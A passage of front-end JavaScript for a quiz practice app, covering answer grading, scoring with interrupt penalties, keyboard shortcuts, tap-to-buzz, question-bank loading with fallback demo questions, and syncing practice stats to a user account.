                          `Official: <span style="color:var(--muted)">${escapeHtml(ca)}</span>` +
                          extra;
      feedback.className = 'feedback';
      animateIn(feedback);

      if (showButtons) {
        rightBtn.classList.remove('hidden');
        wrongBtn.classList.remove('hidden');
        animateIn(rightBtn);
        animateIn(wrongBtn);
      } else {
        rightBtn.classList.add('hidden');
        wrongBtn.classList.add('hidden');
      }

      nextBtn.classList.add('hidden');
      learnRow.classList.add('hidden');
    }

    function applyGrade(isRight) {
      // ---- Stats update ----
      stats.answered++;
      
      const gradeTime = Date.now();
      
      const totalSolveTime = questionStartTime
        ? (gradeTime - questionStartTime) / 1000
        : 0;
      
      stats.totalTime += totalSolveTime;
      
      if (isRight) {
        stats.correct++;
        if (totalSolveTime >= 10) stats.slowCorrect++;
      }

      if (!awaitingGrade) return;
      awaitingGrade = false;

      const q = currentQ();
      const points = q && q.bonus ? 10 : 4;

      if (isRight) {
        score += points;
        scoreEl.textContent = String(score);
        feedback.className = 'feedback good';
        feedback.textContent += ` (+${points})`;
      } else {
        if (q && !q.bonus && interrupted) {
          score -= 4;
          scoreEl.textContent = String(score);
          feedback.textContent += ` (-4 interrupt)`;
        }
        feedback.className = 'feedback bad';
      }

      animateIn(feedback);
      rightBtn.classList.add('hidden');
      wrongBtn.classList.add('hidden');

      // Only show Search/Learn AFTER the user grades
      learnRow.classList.remove('hidden');
      animateIn(learnRow);

      resetStopwatch();

      nextBtn.classList.remove('hidden');
      animateIn(nextBtn);
      updateStatsUI();
      const atomScore = computeAtomScore();
    }

    async function submitSA() {
      if (!runActive || !buzzed || locked) return;
      stopStopwatch();
      const q = currentQ();
      if (!q) return;
      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }
      revealFullQuestionNow();
      const result = await gradeAnswer(input.value, q.parsed_answer, q.type);
      if (result) {
        revealManualGrade(input.value, q.parsed_answer, {
          showButtons: false,
          autoInfo: { confidence: result.confidence, matched: result.matched }
        });
        applyGrade(!!result.isCorrect);
      } else {
        revealManualGrade(input.value, q.parsed_answer);
      }
    }

    async function pickMC(letter) {
      if (!runActive || !buzzed || locked) return;
      stopStopwatch();
      const q = currentQ();
      if (!q) return;
      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }
      revealFullQuestionNow();
      const result = await gradeAnswer(letter, q.parsed_answer, q.type);
      if (result) {
        revealManualGrade(letter, q.parsed_answer, {
          showButtons: false,
          autoInfo: { confidence: result.confidence, matched: result.matched }
        });
        applyGrade(!!result.isCorrect);
      } else {
        revealManualGrade(letter, q.parsed_answer);
      }
    }

    async function handleTimeout() {
      if (!runActive || locked) return;
      stopStopwatch();
      const q = currentQ();
      if (!q) return;
      if (interruptBadgeEl) {
        interruptBadgeEl.classList.add('hidden');
      }
      revealFullQuestionNow();
      const result = await gradeAnswer('', q.parsed_answer, q.type);
      if (result) {
        revealManualGrade('', q.parsed_answer, {
          showButtons: false,
          autoInfo: { confidence: result.confidence, matched: result.matched }
        });
        applyGrade(!!result.isCorrect);
      } else {
        revealManualGrade('', q.parsed_answer);
      }
    }

    async function syncRunStats() {
      if (!stats) return;
      if (!window.atomAccount) {
        try {
          await import('./account_store.js');
        } catch {
          return;
        }
      }
      const account = window.atomAccount;
      if (!account?.getUser?.()) return;
      const patch = {
        totalRuns: 1,
        totalAnswered: stats.answered,
        totalCorrect: stats.correct,
        totalTime: stats.totalTime,
        totalSlowCorrect: stats.slowCorrect
      };
      try {
        await account.updatePracticeStats(patch);
      } catch {}
    }

    function endRun(reason) {
      runActive = false;
      clearInterval(timerId);
      buzzEl.textContent = reason || 'Run complete';

      img.style.display = 'none';
      img.src = '';
      img.alt = '';
      questionTextEl.classList.add('hidden');
      questionTextEl.textContent = '';
      clearInterval(typewriterTimer);

      input.classList.add('hidden');
      submitBtn.classList.add('hidden');
      choicesEl.classList.add('hidden');
      rightBtn.classList.add('hidden');
      wrongBtn.classList.add('hidden');
      nextBtn.classList.add('hidden');
      learnRow.classList.add('hidden');

     const mode = String(runCfg.mode || 'rapid').toLowerCase();

      let maxScore = 0;
      if (mode === 'tossups' || mode === 'bonuses') {
        maxScore = questions.length * 4;
      } else {
        const totalPairs = questions.length ? Math.ceil(questions.length / 2) : 0;
        maxScore = totalPairs * 14;
      }

      // Show final summary (DOM-based)
      const atomScore = computeAtomScore();

      if (finalScoreEl) {
        finalScoreEl.textContent = maxScore ? `Final score: ${score}/${maxScore}` : `Final score: ${score}`;
      }
      if (atomScoreValueEl) {
        atomScoreValueEl.textContent = Number.isFinite(atomScore) ? atomScore.toFixed(3) : '—';
      }
      if (finalSummaryEl) {
        finalSummaryEl.classList.remove('hidden');
        animateIn(finalSummaryEl);
      }

      syncRunStats();

      // Clear/hide feedback so it doesn't become the end-screen container
      feedback.textContent = '';
      feedback.className = 'feedback';


      progressEl.textContent = '—';

      buzzed = false;
      locked = true;
      awaitingGrade = false;
    }

    function revealFullQuestionNow() {
      const q = currentQ();
      if (!q) return;
      clearInterval(typewriterTimer);
      questionTextEl.textContent = String(q.question_text || '');
    }

    function nextQuestion() {
      resetStopwatch();  
      if (!runActive) return;
      if (!locked) return;
      if (awaitingGrade) return;

      index += 1;
      if (index >= questions.length) {
        endRun('Run complete');
        return;
      }

      loadQuestion();
    }

    // Events
    window.addEventListener('keydown', (e) => {
      if (e.altKey && e.key.toLowerCase() === 's') {
        e.preventDefault();
        stopReadingNow();
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 't') {
        e.preventDefault();
        toggleTts();
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 'b') {
        e.preventDefault();
        handleBuzzTrigger();
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 'n') {
        e.preventDefault();
        nextQuestion();
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 'f') {
        e.preventDefault();
        if (input && !input.classList.contains('hidden')) input.focus();
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 'h') {
        e.preventDefault();
        const help = document.getElementById('hotkeyHelp');
        if (help) help.classList.toggle('open');
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 'r') {
        e.preventDefault();
        applyGrade(true);
        return;
      }
      if (e.altKey && e.key.toLowerCase() === 'w') {
        e.preventDefault();
        applyGrade(false);
        return;
      }
      const target = e.target as HTMLElement | null;
      const tag = target?.tagName?.toLowerCase();
      const isTyping = tag === 'input' || tag === 'textarea' || target?.isContentEditable;

      // Prevent space from scrolling ONLY when not typing (keeps spaces working in answer box)
      if (e.code === 'Space' && !isTyping) e.preventDefault();

      if (e.key === 'Escape') {
        window.location.href = 'practice_home.html';
        return;
      }

      const q = currentQ();
      if (!runActive || !q) return;

      if (awaitingGrade) {
        const k2 = e.key.toUpperCase();
        if (k2 === 'R') applyGrade(true);
        if (k2 === 'W') applyGrade(false);
        return;
      }

      if (e.code === 'Space' && !buzzed && !locked && !isTyping) {
        handleBuzzTrigger();
        return;
      }

      if (e.code === 'Enter' && buzzed && !locked && (q.type === 'SA' || interrupted)) submitSA();

      if (buzzed && !locked && q.type === 'MC' && !interrupted) {
        const k = e.key.toUpperCase();
        if (['W','X','Y','Z'].includes(k)) pickMC(k);
      }

      if (e.key.toUpperCase() === 'N' && locked) nextQuestion();
    }, { passive: false });

    // Tap / click anywhere to buzz (mobile-friendly)
    const questionCard = document.querySelector('.question-card');

    function shouldIgnoreTap(target) {
      const el = target as HTMLElement | null;
      return !!el?.closest('input, textarea, button, a, select, label');
    }

    function tapToBuzz(e) {
      if (shouldIgnoreTap(e.target)) return;
      handleBuzzTrigger();
    }

    if (questionCard) {
      questionCard.addEventListener('pointerdown', tapToBuzz);
    }
    window.addEventListener("load", () => {
      warmUpSpeechSynthesis();
    });
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) stopSpeech();
    });
    window.addEventListener('pagehide', stopSpeech);
    window.addEventListener('beforeunload', stopSpeech);


    submitBtn.addEventListener('click', submitSA);
    rightBtn.addEventListener('click', () => applyGrade(true));
    wrongBtn.addEventListener('click', () => applyGrade(false));
    nextBtn.addEventListener('click', nextQuestion);

    choicesEl.addEventListener('click', (e) => {
      const target = e.target as HTMLElement | null;
      const btn = target?.closest('button[data-letter]') as HTMLElement | null;
      if (!btn) return;
      const letter = btn.dataset.letter;
      if (!letter) return;
      pickMC(letter);
    });

    searchBtn.addEventListener('click', () => {
      const q = currentQ();
      if (!q || !q.parsed_answer) return;
      const query = encodeURIComponent(q.parsed_answer);
      window.location.assign(`https://www.bing.com/search?q=${query}`);
    });

    learnBtn.addEventListener('click', () => {
      const q = currentQ();
      if (!q) return;
      localStorage.setItem('atom_tutor_context', JSON.stringify({
        answer: q.parsed_answer,
        category: q.category,
        level: q.level
      }));
      window.location.href = 'tutor.html';
    });

    async function loadBank() {
      const requested = runCfg.bankFile || DEFAULT_RUN.bankFile;
      const tried = [];

      async function tryLoad(bankFile) {
        const cands = bankCandidates(bankFile);
        for (const url of cands) {
          tried.push(url);
          try {
            const res = await fetch(url, { cache: 'no-store' });
            if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
            const data = await res.json();
            hideError();
            return Array.isArray(data) ? data : (data.questions || []);
          } catch {}
        }
        return null;
      }

      if (isLikelyFileProtocol()) {
        showError(
          `Bank load blocked (file://).

` +
          `Use a local server (VS Code Live Server) or GitHub Pages.
` +
          `Requested bank: ${requested}`
        );
      }

      // 1) requested bank
      let data = await tryLoad(requested);
      if (data && data.length) return data;

      // 2) fallback to set_A.json
      if (requested !== 'data/set_A.json') {
        data = await tryLoad('data/set_A.json');
        if (data && data.length) {
          showError(
            `⚠ Failed to load ${requested}.
` +
            `Fell back to data/set_A.json.

` +
            `Tried: ${tried.join(', ')}`
          );
          return data;
        }
      }

      // 3) final demo fallback
      showError(
        `Failed to load any bank.

` +
        `Requested: ${requested}
` +
        `Tried: ${tried.join(', ')}

` +
        `Fix: ensure JSON exists and run via a web server.`
      );

      return [
        {
          set_name: 'DEMO',
          round_name: 'demo',
          num: 1,
          bonus: false,
          level: 'MS',
          category: 'BIOLOGY',
          type: 'SA',
          question_text: 'What organelle is known as the powerhouse of the cell?',
          parsed_answer: 'MITOCHONDRIA'
        },
        {
          set_name: 'DEMO',
          round_name: 'demo',
          num: 2,
          bonus: true,
          level: 'MS',
          category: 'BIOLOGY',
          type: 'SA',
          question_text: 'This organelle contains its own DNA and is responsible for respiration',
          parsed_answer: 'MITOCHONDRIA'
        }
      ];
    }

    (async () => {
      questions = [];
      index = 0;

      bank = await loadBank();
      questions = buildRunQuestions();

      if (!questions.length) {
        runActive = false;
        buzzEl.textContent = 'No questions matched — press Esc';
        progressEl.textContent = '—';
        return;
      }

      runActive = true;
      score = 0;
      scoreEl.textContent = '0';

      loadQuestion();
    })();
  





})();
